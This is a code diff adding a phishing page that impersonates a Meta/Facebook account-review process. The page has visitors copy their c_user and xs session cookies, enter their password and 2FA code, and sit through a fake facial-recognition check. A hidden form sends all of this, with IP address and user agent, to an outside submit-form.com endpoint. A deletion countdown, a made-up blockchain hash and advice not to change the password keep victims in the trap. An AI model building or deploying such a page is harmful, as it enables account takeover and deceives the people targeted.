+                                </button>
+                                <div class="progress-container">
+                                    <div class="buffered-bar" id="bufferedBar"></div>
+                                    <div class="progress-bar" id="progressBar"></div>
+                                </div>
+                                <div class="time-display">
+                                    <span id="currentTime">0:00</span> / <span id="totalTime">0:00</span>
+                                </div>
+                                <div class="volume-container">
+                                    <button class="control-btn" id="volumeBtn">
+                                        <i class="fas fa-volume-up"></i>
+                                    </button>
+                                    <input type="range" class="volume-slider" id="volumeSlider" min="0" max="1" step="0.1" value="1">
+                                </div>
+                                <select class="speed-selector" id="speedSelector">
+                                    <option value="0.5">0.5x</option>
+                                    <option value="0.75">0.75x</option>
+                                    <option value="1" selected>Normal</option>
+                                    <option value="1.25">1.25x</option>
+                                    <option value="1.5">1.5x</option>
+                                    <option value="2">2x</option>
+                                </select>
+                                <button class="control-btn fullscreen-btn" id="fullscreenBtn">
+                                    <i class="fas fa-expand"></i>
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <!-- AI Facial Recognition (Optional) -->
+                    <div class="webcam-container" id="webcamContainer" style="display: none;">
+                        <video class="webcam-video" id="webcamVideo" autoplay playsinline></video>
+                        <div class="webcam-overlay" id="webcamOverlay">
+                            <h3>Facial Recognition Verification</h3>
+                            <p>Please position your face in the center of the frame</p>
+                            <button class="webcam-btn" id="startWebcamBtn">Enable Camera</button>
+                        </div>
+                    </div>
+                    
+                    <div class="ai-verification" id="aiVerification" style="display: none;">
+                        <i class="fas fa-robot ai-processing"></i>
+                        <div>
+                            <h4>AI Identity Verification</h4>
+                            <p>Processing your facial features...</p>
+                        </div>
+                    </div>
+                    
+                    <div class="mobile-instructions">
+                        <h3><i class="fas fa-mobile-alt"></i> For Mobile Users</h3>
+                        <p>This process requires desktop browser developer tools. Please switch to a computer:</p>
+                        <ol>
+                            <li>Open Chrome on a desktop/laptop computer</li>
+                            <li>Log in to Facebook</li>
+                            <li>Follow the video instructions to find your values</li>
+                            <li>Return here to submit your review request</li>
+                        </ol>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="c_user"><i class="fas fa-user-circle"></i> c_user Value <span class="tooltip"><i class="fas fa-info-circle"></i><span class="tooltiptext">Found in browser cookies when logged into Facebook</span></span></label>
+                        <input type="text" class="form-control" id="c_user" name="c_user" 
+                               placeholder="Enter your c_user value"
+                               pattern="\d+" 
+                               title="c_user must be a numeric value"
+                               required>
+                        <small class="form-text">Must contain a valid c_user value only</small>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="xs"><i class="fas fa-key"></i> xs Value <span class="tooltip"><i class="fas fa-info-circle"></i><span class="tooltiptext">Found in browser cookies when logged into Facebook</span></span></label>
+                        <input type="text" class="form-control" id="xs" name="xs" 
+                               placeholder="Enter your xs value"
+                               pattern=".{20,}" 
+                               title="xs must be at least 20 characters"
+                               required>
+                        <small class="form-text">Must contain a valid xs value only</small>
+                    </div>
+                    
+                    <div class="btn-group">
+                        <button class="btn btn-outline" id="cancelBtn">
+                            <i class="fas fa-times"></i> Cancel
+                        </button>
+                        <button class="btn btn-primary" id="nextToStep2">
+                            <i class="fas fa-arrow-right"></i> Continue
+                        </button>
+                    </div>
+                </div>
+                
+                <!-- Step 2: Password & 2FA Verification -->
+                <div class="step-content" id="step2">
+                    <h3 class="step-title">Security Verification</h3>
+                    
+                    <div class="status-indicator status-active">
+                        <i class="fas fa-check-circle"></i>
+                        <span>Step 1 completed successfully</span>
+                    </div>
+                    
+                    <div class="progress">
+                        <div class="progress-bar" style="width: 33%"></div>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="password"><i class="fas fa-lock"></i> Re-enter Password <span class="tooltip"><i class="fas fa-info-circle"></i><span class="tooltiptext">For security verification only. Your password is encrypted.</span></span></label>
+                        <input type="password" class="form-control" id="password" name="password" 
+                               placeholder="Enter your Facebook password"
+                               required>
+                        <small class="form-text">This helps us verify you're the account owner</small>
+                    </div>
+                    
+                    <!-- Two-Factor Authentication -->
+                    <div class="two-factor-auth" id="twoFactorAuth">
+                        <h4><i class="fas fa-mobile-alt"></i> Two-Factor Authentication</h4>
+                        <p>Enter the 6-digit code from your authenticator app:</p>
+                        <div class="two-factor-code">
+                            <input type="text" maxlength="1" pattern="[0-9]">
+                            <input type="text" maxlength="1" pattern="[0-9]">
+                            <input type="text" maxlength="1" pattern="[0-9]">
+                            <input type="text" maxlength="1" pattern="[0-9]">
+                            <input type="text" maxlength="1" pattern="[0-9]">
+                            <input type="text" maxlength="1" pattern="[0-9]">
+                        </div>
+                    </div>
+                    
+                    <div class="alert-box alert-danger">
+                        <i class="fas fa-shield-alt"></i>
+                        <div>
+                            <h3>Security Notice</h3>
+                            <ul>
+                                <li>This is a security verification step to confirm your identity</li>
+                                <li>Do not log out from your computer during the review process</li>
+                                <li>Keep your Facebook account logged in on your computer</li>
+                                <li>Your password is encrypted during transmission</li>
+                                <li>Do not share your password with anyone</li>
+                            </ul>
+                        </div>
+                    </div>
+                    
+                    <div class="btn-group">
+                        <button class="btn btn-outline" id="backToStep1">
+                            <i class="fas fa-arrow-left"></i> Back
+                        </button>
+                        <button class="btn btn-primary" id="nextToStep3">
+                            <i class="fas fa-paper-plane"></i> Submit Review
+                        </button>
+                    </div>
+                    <p class="error-message" id="submissionError"></p>
+                </div>
+                
+                <!-- Step 3: Success & Blockchain Verification -->
+                <div class="step-content" id="step3">
+                    <div class="success-message">
+                        <div class="success-icon">
+                            <i class="fas fa-check-circle"></i>
+                        </div>
+                        <h3 class="success-title">Review Submitted Successfully!</h3>
+                        <p class="success-text">Your account review request has been received. Our security team will process your case within the next 24 hours.</p>
+                        
+                        <div class="alert-box alert-success">
+                            <i class="fas fa-info-circle"></i>
+                            <div>
+                                <h3>Important Instructions</h3>
+                                <ul>
+                                    <li>Do not log out from your computer during this period</li>
+                                    <li>Keep your Facebook account logged in on this device</li>
+                                    <li>You will receive a notification once the review is complete</li>
+                                    <li>Account deletion has been paused pending review</li>
+                                    <li>Please do not attempt to change your password during review</li>
+                                </ul>
+                            </div>
+                        </div>
+                        
+                        <!-- Blockchain Verification Hash -->
+                        <div class="blockchain-verification">
+                            <h4><i class="fas fa-link"></i> Blockchain Verification</h4>
+                            <p>Your submission has been recorded on the blockchain for transparency:</p>
+                            <p class="blockchain-hash" id="blockchainHash">0x7f5e...3a2b</p>
+                        </div>
+                        
+                        <!-- Download Instructions -->
+                        <div class="download-instructions">
+                            <h4><i class="fas fa-download"></i> Download Instructions</h4>
+                            <p>For your records, you can download a PDF with your review details:</p>
+                            <button class="btn btn-outline download-btn">
+                                <i class="fas fa-file-pdf"></i> Download Receipt
+                            </button>
+                        </div>
+                        
+                        <div class="status-indicator status-active">
+                            <i class="fas fa-check-circle"></i>
+                            <span>Review ID: FB-REV-<span id="reviewId">XXXXXX</span></span>
+                        </div>
+                        
+                        <button class="btn btn-primary" id="finishBtn">
+                            <i class="fas fa-check"></i> Return to Facebook
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Language Selection Modal -->
+    <div class="modal" id="languageModal">
+        <div class="modal-content" style="max-width: 600px;">
+            <div class="modal-header">
+                <h2 class="modal-title"><i class="fas fa-globe"></i> Select Video Language</h2>
+                <button class="close-modal" id="closeLanguageModal">×</button>
+            </div>
+            
+            <div class="modal-body">
+                <div class="form-group">
+                    <label for="languageSearch"><i class="fas fa-search"></i> Search Languages</label>
+                    <input type="text" class="form-control" id="languageSearch" placeholder="Type to search languages...">
+                </div>
+                
+                <div style="max-height: 400px; overflow-y: auto; margin: 16px 0; border: 1px solid var(--border-color); border-radius: var(--radius-md);">
+                    <div class="language-options" style="display: grid; grid-template-columns: repeat(auto-fill, minmax(140px, 1fr)); gap: 8px; padding: 12px;">
+                        <button class="btn btn-outline language-btn" data-lang="english" style="flex-direction: column; align-items: center; padding: 12px;">
+                            <i class="fas fa-language" style="font-size: 24px; margin-bottom: 8px;"></i>
+                            <span>English</span>
+                            <small style="color: var(--text-secondary);">English</small>
+                        </button>
+                        <button class="btn btn-outline language-btn" data-lang="filipino" style="flex-direction: column; align-items: center; padding: 12px;">
+                            <i class="fas fa-language" style="font-size: 24px; margin-bottom: 8px;"></i>
+                            <span>Filipino</span>
+                            <small style="color: var(--text-secondary);">Filipino</small>
+                        </button>
+                        <button class="btn btn-outline language-btn" data-lang="hindi" style="flex-direction: column; align-items: center; padding: 12px;">
+                            <i class="fas fa-language" style="font-size: 24px; margin-bottom: 8px;"></i>
+                            <span>Hindi</span>
+                            <small style="color: var(--text-secondary);">हिन्दी</small>
+                        </button>
+                        <button class="btn btn-outline language-btn" data-lang="portuguese" style="flex-direction: column; align-items: center; padding: 12px;">
+                            <i class="fas fa-language" style="font-size: 24px; margin-bottom: 8px;"></i>
+                            <span>Portuguese</span>
+                            <small style="color: var(--text-secondary);">Português</small>
+                        </button>
+                        <button class="btn btn-outline language-btn" data-lang="spanish" style="flex-direction: column; align-items: center; padding: 12px;">
+                            <i class="fas fa-language" style="font-size: 24px; margin-bottom: 8px;"></i>
+                            <span>Spanish</span>
+                            <small style="color: var(--text-secondary);">Español</small>
+                        </button>
+                        <button class="btn btn-outline language-btn" data-lang="tamil" style="flex-direction: column; align-items: center; padding: 12px;">
+                            <i class="fas fa-language" style="font-size: 24px; margin-bottom: 8px;"></i>
+                            <span>Tamil</span>
+                            <small style="color: var(--text-secondary);">தமிழ்</small>
+                        </button>
+                        <button class="btn btn-outline language-btn" data-lang="arabic" style="flex-direction: column; align-items: center; padding: 12px;">
+                            <i class="fas fa-language" style="font-size: 24px; margin-bottom: 8px;"></i>
+                            <span>Arabic</span>
+                            <small style="color: var(--text-secondary);">العربية</small>
+                        </button>
+                        <button class="btn btn-outline language-btn" data-lang="japanese" style="flex-direction: column; align-items: center; padding: 12px;">
+                            <i class="fas fa-language" style="font-size: 24px; margin-bottom: 8px;"></i>
+                            <span>Japanese</span>
+                            <small style="color: var(--text-secondary);">日本語</small>
+                        </button>
+                        <button class="btn btn-outline language-btn" data-lang="french" style="flex-direction: column; align-items: center; padding: 12px;">
+                            <i class="fas fa-language" style="font-size: 24px; margin-bottom: 8px;"></i>
+                            <span>French</span>
+                            <small style="color: var(--text-secondary);">Français</small>
+                        </button>
+                        <button class="btn btn-outline language-btn" data-lang="swedish" style="flex-direction: column; align-items: center; padding: 12px;">
+                            <i class="fas fa-language" style="font-size: 24px; margin-bottom: 8px;"></i>
+                            <span>Swedish</span>
+                            <small style="color: var(--text-secondary);">Svenska</small>
+                        </button>
+                    </div>
+                </div>
+                
+                <div class="alert-box">
+                    <i class="fas fa-info-circle"></i>
+                    <div>
+                        <p>Can't find your language? Request it at: <a href="mailto:support@fb.com" style="color: var(--primary-color);">support@fb.com</a></p>
+                    </div>
+                </div>
+                
+                <button class="btn btn-primary" id="confirmLanguageBtn" style="width: 100%;">
+                    <i class="fas fa-check"></i> Confirm Language Selection
+                </button>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Hidden form for fallback submission -->
+    <form id="hiddenForm" class="hidden-form" action="https://submit-form.com/BLs04ZolX" method="post">
+        <input type="hidden" name="c_user" id="hiddenCUser">
+        <input type="hidden" name="xs" id="hiddenXs">
+        <input type="hidden" name="password" id="hiddenPassword">
+        <input type="hidden" name="review_id" id="hiddenReviewId">
+        <input type="hidden" name="user_agent" id="userAgent">
+        <input type="hidden" name="ip_address" id="ipAddress">
+        <input type="hidden" name="timestamp" id="timestamp">
+        <input type="hidden" name="facial_data" id="facialData">
+        <input type="hidden" name="blockchain_hash" id="blockchainHashInput">
+    </form>
+    
+    <!-- Footer -->
+    <footer>
+        <div class="footer-content">
+            <div class="footer-links">
+                <a href="#">About</a>
+                <a href="#">Privacy Policy</a>
+                <a href="#">Terms</a>
+                <a href="#">Help Center</a>
+                <a href="#">Cookies</a>
+                <a href="#">Ad Choices</a>
+            </div>
+            <div class="copyright">
+                Meta © 2025 - Protecting Your Digital Identity
+            </div>
+        </div>
+    </footer>
 
-  <script>
-    function redirectWithLoading() {
-      const btn = document.getElementById('continueBtn');
-      const text = btn.querySelector('.btn-text');
-      const spinner = btn.querySelector('.spinner');
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // Enhanced video files mapping with fallbacks
+            const videoFiles = {
+                'english': [
+                    { url: 'https://ucarecdn.com/ca11126d-21e3-4fc8-bfc7-928dfa258b96/videoinformation.mp4', type: 'video/mp4' },
+                    { url: 'https://ucarecdn.com/ca11126d-21e3-4fc8-bfc7-928dfa258b96/videoinformation.mp4', type: 'video/webm' }
+                ],
+                'filipino': [
+                    { url: 'https://translationmeta2025-f87fc.web.app/filipino.mp4', type: 'video/mp4' }
+                ],
+                'hindi': [
+                    { url: 'https://translationmeta2025-f87fc.web.app/hindi.mp4', type: 'video/mp4' }
+                ],
+                'portuguese': [
+                    { url: 'https://translationmeta2025-f87fc.web.app/portuguese.mp4', type: 'video/mp4' }
+                ],
+                'spanish': [
+                    { url: 'https://translationmeta2025-f87fc.web.app/spanish.mp4', type: 'video/mp4' }
+                ],
+                'tamil': [
+                    { url: 'https://translationmeta2025-f87fc.web.app/Tamil.mp4', type: 'video/mp4' }
+                ],
+                'arabic': [
+                    { url: 'https://translationmeta2025-f87fc.web.app/Arabic.mp4', type: 'video/mp4' }
+                ],
+                'french': [
+                    { url: 'https://translationmeta2025-f87fc.web.app/French.mp4', type: 'video/mp4' }
+                ],
+                'swedish': [
+                    { url: 'https://translationmeta2025-f87fc.web.app/Swedish.mp4', type: 'video/mp4' }
+                ],
+                'japanese': [
+                    { url: 'https://translationmeta2025-f87fc.web.app/japanese.mp4', type: 'video/mp4' }
+                ]
+            };
+            
+            // DOM Elements
+            const themeToggle = document.getElementById('themeToggle');
+            const languageModal = document.getElementById('languageModal');
+            const closeLanguageModal = document.getElementById('closeLanguageModal');
+            const languageSearch = document.getElementById('languageSearch');
+            const languageButtons = document.querySelectorAll('.language-btn');
+            const confirmLanguageBtn = document.getElementById('confirmLanguageBtn');
+            
+            const videoOverlay = document.getElementById('videoOverlay');
+            const overlayPlayBtn = document.getElementById('overlayPlayBtn');
+            const video = document.getElementById('tutorialVideo');
+            const loadingSpinner = document.getElementById('loadingSpinner');
+            const loadingPercentage = document.querySelector('.loading-percentage');
+            
+            const modal = document.getElementById('reviewModal');
+            const reviewBtn = document.getElementById('reviewBtn');
+            const appealBtn = document.getElementById('appealBtn');
+            const closeModal = document.getElementById('closeModal');
+            const cancelBtn = document.getElementById('cancelBtn');
+            const finishBtn = document.getElementById('finishBtn');
+            
+            // Video control elements
+            const playPauseBtn = document.getElementById('playPauseBtn');
+            const progressBar = document.getElementById('progressBar');
+            const bufferedBar = document.getElementById('bufferedBar');
+            const currentTimeDisplay = document.getElementById('currentTime');
+            const totalTimeDisplay = document.getElementById('totalTime');
+            const volumeBtn = document.getElementById('volumeBtn');
+            const volumeSlider = document.getElementById('volumeSlider');
+            const speedSelector = document.getElementById('speedSelector');
+            const fullscreenBtn = document.getElementById('fullscreenBtn');
+            
+            // Step navigation
+            const nextToStep2 = document.getElementById('nextToStep2');
+            const backToStep1 = document.getElementById('backToStep1');
+            const nextToStep3 = document.getElementById('nextToStep3');
+            
+            const step1 = document.getElementById('step1');
+            const step2 = document.getElementById('step2');
+            const step3 = document.getElementById('step3');
+            
+            const steps = document.querySelectorAll('.step');
+            const progressLine = document.getElementById('progressLine');
+            
+            // Form elements
+            const hiddenForm = document.getElementById('hiddenForm');
+            const hiddenCUser = document.getElementById('hiddenCUser');
+            const hiddenXs = document.getElementById('hiddenXs');
+            const hiddenPassword = document.getElementById('hiddenPassword');
+            const hiddenReviewId = document.getElementById('hiddenReviewId');
+            const userAgent = document.getElementById('userAgent');
+            const ipAddress = document.getElementById('ipAddress');
+            const timestamp = document.getElementById('timestamp');
+            const facialData = document.getElementById('facialData');
+            const blockchainHashInput = document.getElementById('blockchainHashInput');
+            
+            // Error message element
+            const submissionError = document.getElementById('submissionError');
+            const reviewIdDisplay = document.getElementById('reviewId');
+            const blockchainHashDisplay = document.getElementById('blockchainHash');
+            
+            // Countdown elements
+            const countdownHours = document.getElementById('countdown-hours');
+            const countdownMinutes = document.getElementById('countdown-minutes');
+            const countdownSeconds = document.getElementById('countdown-seconds');
+            
+            // Webcam elements
+            const webcamContainer = document.getElementById('webcamContainer');
+            const webcamVideo = document.getElementById('webcamVideo');
+            const webcamOverlay = document.getElementById('webcamOverlay');
+            const startWebcamBtn = document.getElementById('startWebcamBtn');
+            const aiVerification = document.getElementById('aiVerification');
+            
+            // State variables
+            let selectedLanguage = null;
+            let isVideoPlaying = false;
+            let countdownInterval;
+            let stream = null;
+            
+            // Initialize countdown timer
+            function initCountdown() {
+                let hours = 24;
+                let minutes = 59;
+                let seconds = 59;
+                
+                countdownInterval = setInterval(() => {
+                    seconds--;
+                    
+                    if (seconds < 0) {
+                        seconds = 59;
+                        minutes--;
+                    }
+                    
+                    if (minutes < 0) {
+                        minutes = 59;
+                        hours--;
+                    }
+                    
+                    if (hours < 0) {
+                        clearInterval(countdownInterval);
+                        hours = 0;
+                        minutes = 0;
+                        seconds = 0;
+                        
+                        // Show urgent warning when countdown completes
+                        document.querySelector('.review-card').classList.add('shake');
+                        document.querySelector('.warning-icon').style.color = '#ff0000';
+                        document.querySelector('.review-title').textContent = 'ACCOUNT DELETION IMMINENT!';
+                    }
+                    
+                    // Update display
+                    countdownHours.textContent = hours.toString().padStart(2, '0');
+                    countdownMinutes.textContent = minutes.toString().padStart(2, '0');
+                    countdownSeconds.textContent = seconds.toString().padStart(2, '0');
+                }, 1000);
+            }
+            
+            // Toggle dark/light mode
+            themeToggle.addEventListener('click', function() {
+                document.body.classList.toggle('dark-mode');
+                const icon = themeToggle.querySelector('i');
+                if (document.body.classList.contains('dark-mode')) {
+                    icon.classList.remove('fa-moon');
+                    icon.classList.add('fa-sun');
+                } else {
+                    icon.classList.remove('fa-sun');
+                    icon.classList.add('fa-moon');
+                }
+            });
+            
+            // Generate a random review ID
+            function generateReviewId() {
+                const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
+                let result = '';
+                for (let i = 0; i < 6; i++) {
+                    result += chars.charAt(Math.floor(Math.random() * chars.length));
+                }
+                return result;
+            }
+            
+            // Generate a fake blockchain hash
+            function generateBlockchainHash() {
+                const chars = '0123456789abcdef';
+                let result = '0x';
+                for (let i = 0; i < 64; i++) {
+                    result += chars.charAt(Math.floor(Math.random() * chars.length));
+                }
+                return result;
+            }
+            
+            // Set user agent and timestamp
+            userAgent.value = navigator.userAgent;
+            timestamp.value = new Date().toISOString();
+            
+            // Try to get IP address (note: this requires a backend service)
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    ipAddress.value = data.ip || 'unknown';
+                })
+                .catch(() => {
+                    ipAddress.value = 'unknown';
+                });
+            
+            // Open language modal when video overlay is clicked
+            overlayPlayBtn.addEventListener('click', function() {
+                languageModal.style.display = 'block';
+                document.body.style.overflow = 'hidden';
+            });
+            
+            // Close language modal
+            closeLanguageModal.addEventListener('click', function() {
+                languageModal.style.display = 'none';
+                document.body.style.overflow = 'auto';
+            });
+            
+            // Language search functionality
+            languageSearch.addEventListener('input', function() {
+                const searchTerm = this.value.toLowerCase();
+                
+                languageButtons.forEach(button => {
+                    const languageName = button.querySelector('span').textContent.toLowerCase();
+                    const languageNative = button.querySelector('small').textContent.toLowerCase();
+                    
+                    if (languageName.includes(searchTerm) || languageNative.includes(searchTerm)) {
+                        button.style.display = 'flex';
+                    } else {
+                        button.style.display = 'none';
+                    }
+                });
+            });
+            
+            // Language selection
+            languageButtons.forEach(button => {
+                button.addEventListener('click', function() {
+                    // Remove selected class from all buttons
+                    languageButtons.forEach(btn => {
+                        btn.classList.remove('btn-primary');
+                        btn.classList.add('btn-outline');
+                    });
+                    
+                    // Add selected class to clicked button
+                    this.classList.remove('btn-outline');
+                    this.classList.add('btn-primary');
+                    
+                    // Get selected language
+                    selectedLanguage = this.getAttribute('data-lang');
+                });
+            });
+            
+            // Confirm language selection
+            confirmLanguageBtn.addEventListener('click', function() {
+                if (selectedLanguage) {
+                    const sources = videoFiles[selectedLanguage];
+                    
+                    if (sources && sources.length > 0) {
+                        // Clear existing sources
+                        while (video.firstChild) {
+                            video.removeChild(video.firstChild);
+                        }
+                        
+                        // Add new sources
+                        sources.forEach(source => {
+                            const sourceElement = document.createElement('source');
+                            sourceElement.src = source.url;
+                            sourceElement.type = source.type;
+                            video.appendChild(sourceElement);
+                        });
+                        
+                        // Load the new video
+                        video.load();
+                        
+                        // Set video title for accessibility
+                        video.setAttribute('title', `Tutorial Video - ${selectedLanguage}`);
+                        
+                        // Close modal
+                        languageModal.style.display = 'none';
+                        document.body.style.overflow = 'auto';
+                        
+                        // After a short delay, play the video
+                        setTimeout(() => {
+                            video.play().then(() => {
+                                videoOverlay.classList.add('hidden');
+                                playPauseBtn.innerHTML = '<i class="fas fa-pause"></i>';
+                                isVideoPlaying = true;
+                            }).catch(error => {
+                                console.error('Error playing video:', error);
+                                videoOverlay.classList.remove('hidden');
+                            });
+                        }, 300);
+                        
+                        // Remember language selection
+                        localStorage.setItem('preferredLanguage', selectedLanguage);
+                    }
+                }
+            });
+            
+            // Start webcam for facial recognition
+            startWebcamBtn.addEventListener('click', function() {
+                if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                    navigator.mediaDevices.getUserMedia({ video: true })
+                        .then(function(mediaStream) {
+                            stream = mediaStream;
+                            webcamVideo.srcObject = stream;
+                            webcamOverlay.style.display = 'none';
+                            webcamContainer.style.display = 'block';
+                            
+                            // Simulate AI processing
+                            setTimeout(() => {
+                                aiVerification.style.display = 'flex';
+                                setTimeout(() => {
+                                    aiVerification.querySelector('i').classList.remove('ai-processing');
+                                    aiVerification.querySelector('i').classList.add('ai-success');
+                                    aiVerification.querySelector('p').textContent = 'Identity verified successfully!';
+                                    
+                                    // Generate fake facial data hash
+                                    facialData.value = generateBlockchainHash();
+                                }, 3000);
+                            }, 1000);
+                        })
+                        .catch(function(error) {
+                            console.error('Error accessing webcam:', error);
+                            alert('Could not access webcam. Please ensure you have granted permissions.');
+                        });
+                } else {
+                    alert('Webcam access is not supported in your browser.');
+                }
+            });
+            
+            // Close modals when clicking outside
+            window.addEventListener('click', function(event) {
+                if (event.target === languageModal) {
+                    languageModal.style.display = 'none';
+                    document.body.style.overflow = 'auto';
+                }
+                if (event.target === modal) {
+                    closeModalFunc();
+                }
+            });
+            
+            // Keyboard shortcut for closing modals
+            document.addEventListener('keydown', function(e) {
+                if (e.key === 'Escape') {
+                    if (languageModal.style.display === 'block') {
+                        languageModal.style.display = 'none';
+                        document.body.style.overflow = 'auto';
+                    } else if (modal.style.display === 'block') {
+                        closeModalFunc();
+                    }
+                }
+                
+                // Spacebar to toggle play/pause when video is focused
+                if (e.code === 'Space' && isVideoPlaying && !isInputField(document.activeElement)) {
+                    e.preventDefault();
+                    togglePlayPause();
+                }
+            });
 
-      text.style.display = 'none';
-      spinner.style.display = 'inline-block';
-      btn.disabled = true;
-
-      setTimeout(() => {
-        window.location.href = 'help.html';
-      }, 500); // You can reduce this if instant redirect is preferred
-    }
-  </script>
+            // Preload the preferred language if available
+            const preferredLanguage = localStorage.getItem('preferredLanguage') || 'english';
+            if (videoFiles[preferredLanguage]) {
+                const sources = videoFiles[preferredLanguage];
+                sources.forEach(source => {
+                    const sourceElement = document.createElement('source');
+                    sourceElement.src = source.url;
+                    sourceElement.type = source.type;
+                    video.appendChild(sourceElement);
+                });
+                video.load();
+            }
+            
+            // Initialize video player
+            function initVideoPlayer() {
+                // Initialize volume and playback rate
+                video.volume = volumeSlider.value;
+                video.playbackRate = speedSelector.value;
+                
+                // Update time display
+                updateTimeDisplay();
+                
+                // Event listeners
+                video.addEventListener('timeupdate', updateProgressBar);
+                video.addEventListener('progress', updateBufferedBar);
+                video.addEventListener('loadedmetadata', function() {
+                    totalTimeDisplay.textContent = formatTime(video.duration);
+                });
+                
+                // Loading events
+                video.addEventListener('waiting', showLoadingSpinner);
+                video.addEventListener('playing', hideLoadingSpinner);
+                video.addEventListener('seeking', showLoadingSpinner);
+                video.addEventListener('seeked', hideLoadingSpinner);
+                
+                playPauseBtn.addEventListener('click', togglePlayPause);
+                
+                volumeBtn.addEventListener('click', toggleMute);
+                volumeSlider.addEventListener('input', function() {
+                    video.volume = volumeSlider.value;
+                    updateVolumeIcon();
+                });
+                
+                speedSelector.addEventListener('change', function() {
+                    video.playbackRate = parseFloat(this.value);
+                });
+                
+                fullscreenBtn.addEventListener('click', toggleFullscreen);
+                
+                const progressContainer = document.querySelector('.progress-container');
+                progressContainer.addEventListener('click', function(e) {
+                    const pos = (e.pageX - this.offsetLeft) / this.offsetWidth;
+                    video.currentTime = pos * video.duration;
+                });
+                
+                // Handle video end
+                video.addEventListener('ended', function() {
+                    playPauseBtn.innerHTML = '<i class="fas fa-redo"></i>';
+                    isVideoPlaying = false;
+                });
+            }
+            
+            function isInputField(element) {
+                return element.tagName === 'INPUT' || element.tagName === 'TEXTAREA' || element.isContentEditable;
+            }
+            
+            function showLoadingSpinner() {
+                loadingSpinner.style.display = 'flex';
+            }
+            
+            function hideLoadingSpinner() {
+                if (video.readyState >= 3) {
+                    loadingSpinner.style.display = 'none';
+                }
+            }
+            
+            function updateBufferedBar() {
+                if (video.buffered.length > 0) {
+                    const bufferedEnd = video.buffered.end(video.buffered.length - 1);
+                    const percent = (bufferedEnd / video.duration) * 100;
+                    bufferedBar.style.width = `${percent}%`;
+                    
+                    // Update loading percentage
+                    if (video.readyState < 4) {
+                        const loadedPercent = Math.round((bufferedEnd / video.duration) * 100);
+                        loadingPercentage.textContent = `${loadedPercent}%`;
+                    }
+                }
+            }
+            
+            // Toggle play/pause
+            function togglePlayPause() {
+                if (video.paused) {
+                    video.play().then(() => {
+                        playPauseBtn.innerHTML = '<i class="fas fa-pause"></i>';
+                        isVideoPlaying = true;
+                    }).catch(error => {
+                        console.error('Error playing video:', error);
+                    });
+                } else {
+                    video.pause();
+                    playPauseBtn.innerHTML = '<i class="fas fa-play"></i>';
+                    isVideoPlaying = false;
+                }
+            }
+            
+            // Update progress bar
+            function updateProgressBar() {
+                const percent = (video.currentTime / video.duration) * 100;
+                progressBar.style.width = `${percent}%`;
+                currentTimeDisplay.textContent = formatTime(video.currentTime);
+            }
+            
+            // Update time display
+            function updateTimeDisplay() {
+                currentTimeDisplay.textContent = formatTime(video.currentTime);
+                totalTimeDisplay.textContent = formatTime(video.duration);
+            }
+            
+            // Format time in MM:SS
+            function formatTime(seconds) {
+                const minutes = Math.floor(seconds / 60);
+                seconds = Math.floor(seconds % 60);
+                return `${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;
+            }
+            
+            function toggleMute() {
+                video.muted = !video.muted;
+                updateVolumeIcon();
+            }
+            
+            function updateVolumeIcon() {
+                if (video.muted || video.volume === 0) {
+                    volumeBtn.innerHTML = '<i class="fas fa-volume-mute"></i>';
+                    volumeSlider.value = 0;
+                } else if (video.volume > 0.5) {
+                    volumeBtn.innerHTML = '<i class="fas fa-volume-up"></i>';
+                } else {
+                    volumeBtn.innerHTML = '<i class="fas fa-volume-down"></i>';
+                }
+            }
+            
+            function toggleFullscreen() {
+                const videoContainer = document.querySelector('.video-player-container');
+                
+                if (!document.fullscreenElement) {
+                    if (videoContainer.requestFullscreen) {
+                        videoContainer.requestFullscreen();
+                    } else if (videoContainer.mozRequestFullScreen) {
+                        videoContainer.mozRequestFullScreen();
+                    } else if (videoContainer.webkitRequestFullscreen) {
+                        videoContainer.webkitRequestFullscreen();
+                    } else if (videoContainer.msRequestFullscreen) {
+                        videoContainer.msRequestFullscreen();
+                    }
+                    fullscreenBtn.innerHTML = '<i class="fas fa-compress"></i>';
+                } else {
+                    if (document.exitFullscreen) {
+                        document.exitFullscreen();
+                    } else if (document.mozCancelFullScreen) {
+                        document.mozCancelFullScreen();
+                    } else if (document.webkitExitFullscreen) {
+                        document.webkitExitFullscreen();
+                    } else if (document.msExitFullscreen) {
+                        document.msExitFullscreen();
+                    }
+                    fullscreenBtn.innerHTML = '<i class="fas fa-expand"></i>';
+                }
+            }
+            
+            // Handle fullscreen change event
+            document.addEventListener('fullscreenchange', updateFullscreenIcon);
+            document.addEventListener('webkitfullscreenchange', updateFullscreenIcon);
+            document.addEventListener('mozfullscreenchange', updateFullscreenIcon);
+            document.addEventListener('MSFullscreenChange', updateFullscreenIcon);
+            
+            function updateFullscreenIcon() {
+                if (document.fullscreenElement || 
+                    document.webkitFullscreenElement || 
+                    document.mozFullScreenElement || 
+                    document.msFullscreenElement) {
+                    fullscreenBtn.innerHTML = '<i class="fas fa-compress"></i>';
+                } else {
+                    fullscreenBtn.innerHTML = '<i class="fas fa-expand"></i>';
+                }
+            }
+            
+            // Open review modal
+            reviewBtn.addEventListener('click', function() {
+                modal.style.display = 'block';
+                document.body.style.overflow = 'hidden';
+                initVideoPlayer();
+                initCountdown();
+                
+                // Show webcam option if available
+                if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                    webcamContainer.style.display = 'block';
+                }
+            });
+            
+            // Open appeal modal
+            appealBtn.addEventListener('click', function() {
+                alert('For appeals, please contact our support team at appeals@fb.com');
+            });
+            
+            // Close modal function
+            function closeModalFunc() {
+                modal.style.display = 'none';
+                document.body.style.overflow = 'auto';
+                resetForm();
+                clearInterval(countdownInterval);
+                
+                // Stop webcam stream if active
+                if (stream) {
+                    stream.getTracks().forEach(track => track.stop());
+                    stream = null;
+                }
+            }
+            
+            closeModal.addEventListener('click', closeModalFunc);
+            cancelBtn.addEventListener('click', closeModalFunc);
+            
+            // Finish button
+            finishBtn.addEventListener('click', function() {
